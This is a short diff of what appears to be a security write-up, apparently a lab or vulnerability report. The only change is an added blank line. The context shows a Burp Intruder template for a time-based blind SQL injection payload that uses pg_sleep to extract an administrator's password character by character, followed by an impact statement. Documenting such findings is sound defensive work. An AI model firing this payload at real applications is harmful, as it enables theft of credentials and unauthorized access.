@@ -36,6 +36,7 @@ Example payload template used within [Burp Intruder](https://portswigger.net/bur
 xyz'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 
+
 ##5. Impact
 Complete compromise of administrative credentials through time-based inferential extraction, allowing full unauthorized access to the application via the administrative account.
 
